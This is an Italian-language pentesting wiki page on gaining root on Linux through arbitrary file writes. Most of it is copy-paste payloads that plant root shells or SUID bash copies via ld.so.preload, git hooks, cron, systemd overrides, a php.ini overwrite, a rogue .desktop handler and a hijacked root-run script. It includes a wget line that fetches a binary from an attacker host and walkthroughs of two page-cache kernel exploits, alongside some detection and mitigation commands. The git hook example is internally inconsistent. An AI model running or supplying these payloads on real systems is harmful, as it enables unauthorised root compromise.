# Scrittura arbitraria di file come root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Questo file si comporta come la variabile d'ambiente **`LD_PRELOAD`**, ma funziona anche nei **binari SUID**.\
Se puoi crearlo o modificarlo, ti basta aggiungere un **percorso a una libreria che verrà caricata** con ogni binario eseguito.

Ad esempio: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sono **script** che vengono **eseguiti** in occasione di vari **eventi** in un repository Git, ad esempio quando viene creato un commit, durante un merge... Pertanto, se uno **script o un utente privilegiato** esegue frequentemente queste azioni ed è possibile **scrivere nella cartella `.git`**, questo può essere utilizzato per ottenere una **privesc**.

Ad esempio, è possibile **generare uno script** in un repository Git nella cartella **`.git/hooks`**, in modo che venga sempre eseguito quando viene creato un nuovo commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron e file temporali

Se puoi **scrivere file relativi a cron che root esegue**, di solito puoi ottenere code execution alla successiva esecuzione del job. I target interessanti includono:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Il crontab di root in `/var/spool/cron/` o `/var/spool/cron/crontabs/`
- I timer `systemd` e i servizi che attivano

Controlli rapidi:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Percorsi tipici di abuso:

- **Aggiungere un nuovo cron job root** a `/etc/crontab` o a un file in `/etc/cron.d/`
- **Sostituire uno script** già eseguito da `run-parts`
- **Inserire una backdoor in un target timer esistente** modificando lo script o il binario che avvia

Esempio minimale di payload cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Se puoi scrivere solo all'interno di una directory cron utilizzata da `run-parts`, inserisci invece un file eseguibile lì:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Note:

- `run-parts` di solito ignora i nomi di file contenenti punti, quindi preferisci nomi come `backup` invece di `backup.sh`.
- Alcune distro usano timer `anacron` o `systemd` invece del cron classico, ma l'idea dell'abuso è la stessa: **modificare ciò che root eseguirà in seguito**.

### File di Service e Socket

Se puoi scrivere **file unit di `systemd`** o i file a cui fanno riferimento, potresti riuscire a ottenere code execution come root ricaricando e riavviando l'unità, oppure aspettando che venga attivato il percorso di attivazione del service/socket.

I target interessanti includono:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Override drop-in in `/etc/systemd/system/<unit>.d/*.conf`
- Script/binari del service a cui fanno riferimento `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Percorsi `EnvironmentFile=` scrivibili caricati da un service root

Controlli rapidi:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Percorsi comuni di abuso:

- **Sovrascrivere `ExecStart=`** in una service unit di proprietà di root che puoi modificare
- **Aggiungere un drop-in override** con un `ExecStart=` malevolo e cancellare prima quello precedente
- **Inserire una backdoor nello script/binario** già indicato dalla unit
- **Dirottare un servizio attivato da socket** modificando il file `.service` corrispondente, che viene avviato quando il socket riceve una connessione

Esempio di override malevolo:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Flusso di attivazione tipico:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Se non puoi riavviare autonomamente i servizi, ma puoi modificare un'unità attivata tramite socket, potrebbe essere sufficiente **attendere una connessione client** per attivare l'esecuzione del servizio compromesso come root.

### Sovrascrivere un `php.ini` restrittivo utilizzato da una sandbox PHP privilegiata

Alcuni daemon personalizzati convalidano il PHP fornito dall'utente eseguendo `php` con un **`php.ini` restrittivo** (ad esempio, `disable_functions=exec,system,...`). Se il codice nella sandbox dispone ancora di **qualsiasi primitiva di scrittura** (come `file_put_contents`) e puoi raggiungere il **percorso esatto di `php.ini`** utilizzato dal daemon, puoi **sovrascrivere tale configurazione** per rimuovere le restrizioni e quindi inviare un secondo payload che venga eseguito con privilegi elevati.<sup>[[2]](#references)</sup>

Flusso tipico:

1. Il primo payload sovrascrive la configurazione della sandbox.
2. Il secondo payload esegue il codice, ora che le funzioni pericolose sono state riabilitate.

Esempio minimo (sostituisci il percorso utilizzato dal daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Se il daemon viene eseguito come root (o esegue la validazione utilizzando percorsi di proprietà di root), la seconda esecuzione restituisce un contesto root. Si tratta essenzialmente di una **privilege escalation tramite config overwrite** quando il runtime in sandbox può ancora scrivere file.

### binfmt_misc

Il file situato in `/proc/sys/fs/binfmt_misc` indica quale binary deve eseguire ciascun tipo di file. TODO: verificare i requisiti necessari per abusarne ed eseguire una rev shell quando viene aperto un tipo di file comune.

### Overwrite degli schema handler (come http: o https:)

Un attacker con permessi di scrittura sulle directory di configurazione di una vittima può facilmente sostituire o creare file che modificano il comportamento del sistema, causando un code execution involontario. Modificando il file `$HOME/.config/mimeapps.list` per associare gli URL HTTP e HTTPS a un file malevolo (ad esempio, impostando `x-scheme-handler/http=evil.desktop`), l'attacker fa sì che **facendo clic su qualsiasi link http o https venga eseguito il codice specificato nel file `evil.desktop`**. Ad esempio, dopo aver inserito il seguente codice malevolo in `evil.desktop` all'interno di `$HOME/.local/share/applications`, qualsiasi clic su un URL esterno esegue il comando incorporato:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Per ulteriori informazioni, consulta [**questo post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), dove è stato utilizzato per sfruttare una vulnerabilità reale.

### Root che esegue script/binari scrivibili dall'utente

Se un workflow privilegiato esegue qualcosa come `/bin/sh /home/username/.../script` (o qualsiasi binary all'interno di una directory di proprietà di un utente non privilegiato), puoi hijackarlo:<sup>[[1]](#references)</sup>

- **Rileva l'esecuzione:** monitora i processi con [pspy](https://github.com/DominicBreuker/pspy) per intercettare root mentre invoca percorsi controllati dall'utente:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Conferma la scrivibilità:** assicurati che sia il file target sia la sua directory siano di proprietà del tuo utente o scrivibili da quest'ultimo.
- **Hijack del target:** esegui il backup del binary/script originale e inserisci un payload che crei una shell SUID (o qualsiasi altra azione root), quindi ripristina i permessi:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Attiva l'azione privilegiata** (ad es., premendo un pulsante dell'interfaccia che avvia l'helper). Quando root riesegue il path hijacked, ottieni la shell con privilegi elevati usando `./rootshell -p`.

### Modifica dei file binari privilegiati limitata alla page cache

Alcuni bug del kernel non modificano il file **su disco**. Al contrario, consentono di modificare solo la **copia nella page cache** di un file leggibile. Se puoi colpire un binario **setuid** o comunque eseguito da **root**, l'esecuzione successiva potrebbe eseguire byte controllati dall'attacker presenti in memoria e consentire una privilege escalation, anche se l'hash del file su disco è invariato.

È utile considerarla una **runtime-only file write primitive**:

- **Il disco resta pulito**: l'inode e i byte su disco non cambiano
- **La memoria è dirty**: i processi che leggono o eseguono la pagina in cache ricevono il contenuto modificato dall'attacker
- **L'effetto è temporaneo**: la modifica scompare dopo un reboot o l'eviction della cache

Questa primitive si colloca tra la classica **arbitrary file write** e i più vecchi bug di **page-cache abuse**, come Dirty COW / Dirty Pipe:

- Dirty COW si basava su una race
- Dirty Pipe aveva vincoli sulla posizione di scrittura
- Una primitive limitata alla page cache può essere più affidabile se il percorso vulnerabile consente scritture dirette nelle pagine cached file-backed

#### Flusso generico di privesc

1. Ottieni una kernel primitive in grado di scrivere nelle pagine file-backed della page cache
2. Usala contro un **binario privilegiato leggibile** o un altro file eseguito da root
3. Attiva l'esecuzione **prima** che la pagina venga evicted dalla cache
4. Ottieni code execution come root mentre il file su disco appare ancora non modificato

Target tipici ad alto valore:

- Binari **setuid-root**
- Helper avviati da **servizi root**
- Binari eseguiti comunemente da **container che condividono il kernel/page cache dell'host**

#### Percorso di esempio AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) è un buon esempio di questa classe. Il percorso vulnerabile si trovava nella userspace API crittografica di Linux (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` può spostare riferimenti a pagine della page cache da un file leggibile nella scatterlist TX della crypto
- il percorso di decrypt in-place di `algif_aead` riutilizzava i buffer source e destination
- `authencesn` scriveva quindi nella regione tag della destination
- quando tale regione faceva ancora riferimento a pagine file-backed ottenute tramite splice, la scrittura finiva nella **page cache del file target**

La tecnica interessante, quindi, non è la CVE in sé, ma il pattern:

- **inserire pagine cached file-backed in un sottosistema del kernel**
- fare in modo che il sottosistema le **tratti come output scrivibile**
- attivare un piccolo overwrite controllato in memoria

Il PoC pubblico usava scritture ripetute da **4 byte** per patchare `/usr/bin/su` in memoria e poi eseguirlo.

#### Percorso di esempio ESP / XFRM + netfilter TEE clone

DirtyClone (CVE-2026-43503) mostra un'altra variante dello stesso pattern **page-cache-only write-to-root**, ma questa volta il sink è il **decrypt IPsec ESP** invece di `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

La tecnica importante è il passaggio di **metadata laundering**:

- `splice()` inserisce una **pagina read-only file-backed della page cache** in un pacchetto ESP-in-UDP
- la mitigazione originale di DirtyFrag contrassegnava quello skb con `SKBFL_SHARED_FRAG`, in modo che `esp_input()` eseguisse una **copy** prima del decrypt
- netfilter `TEE` duplica il pacchetto tramite `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- il clone mantiene lo **stesso riferimento fisico alla pagina della page cache**, ma perde `SKBFL_SHARED_FRAG`
- `esp_input()` considera quindi il clone sicuro ed esegue il decrypt **in-place `cbc(aes)`** sulla pagina file-backed

La lezione per il reviewer è più ampia della CVE: se una mitigazione dipende dai **metadati di skb/pagina** per decidere se un'operazione debba prima eseguire una copy, qualsiasi **percorso di clone/copy che preservi la pagina sottostante ma elimini i metadati** può riaprire silenziosamente la write primitive.

Flusso di exploitation tipico:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` per ottenere **`CAP_NET_ADMIN` all'interno di un network namespace privato**
2. attiva il loopback e installa una regola **netfilter `TEE`** in `mangle/OUTPUT`
3. installa le SA di trasporto XFRM ESP tramite `NETLINK_XFRM`
4. codifica ogni word target di 4 byte nel campo `seq_hi` della SA (il word-selection trick di DirtyFrag)
5. invia il pacchetto ESP-in-UDP ottenuto tramite splice, in modo che il **clone TEE** raggiunga `esp_input()` ed esegua il decrypt **in-place**
6. ripeti finché la copia nella page cache di `/usr/bin/su` o di un altro eseguibile privilegiato non contiene codice controllato dall'attacker

Dal punto di vista operativo, l'impatto è lo stesso dell'esempio `AF_ALG`: il file su disco resta pulito, ma `execve()` utilizza i **byte modificati della page cache** e restituisce root.

Controlli utili per verificare l'esposizione a questa variante:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
La riduzione a breve termine della attack surface è anche specifica del percorso in questo caso: l'aggiornamento a un kernel che include `48f6a5356a33` corregge il clone path, mentre il blocco dell'autoload di `xt_TEE` rimuove il **flag-laundering step** e il blocco di `esp4` / `esp6` rimuove il **decrypt sink**.

#### Exposure e hunting

Se sospetti questa classe di bug, non affidarti solo ai controlli di integrità del disco. Verifica inoltre:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` può essere caricato/scaricato come modulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: l'interfaccia è integrata nel kernel
- i binari setuid sono buoni obiettivi perché una patch che agisce solo sulla page cache può essere sufficiente per trasformare un accesso locale iniziale in root

#### Riduzione della superficie di attacco per il percorso `algif_aead`

Se l'interfaccia vulnerabile è fornita da un modulo caricabile:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Se è compilato nel kernel, alcune disclosure hanno segnalato il blocco del percorso init con:
```bash
initcall_blacklist=algif_aead_init
```
Questo tipo di mitigazione è utile da ricordare anche per altri kernel LPE: se l'exploitation dipende da una specifica interfaccia opzionale, disabilitare o mettere in blacklist tale interfaccia può interrompere il percorso di exploit anche prima che sia disponibile un aggiornamento completo del kernel.

## Riferimenti

- [1] [HTB Bamboo – hijacking di uno script eseguito da root in una directory PaperCut scrivibile dall'utente](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Disclosure di Openwall oss-security per CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Fix di Linux stable: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — advisory CVE-2026-31431](https://copy.fail/)
- [7] [Theori / analisi tecnica di Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repository / README di DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analisi e sfruttamento della variante Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Fix di Linux: net: skb: preservare `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigazione precedente di Linux: impostare `SKBFL_SHARED_FRAG` per i pacchetti UDP sottoposti a splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
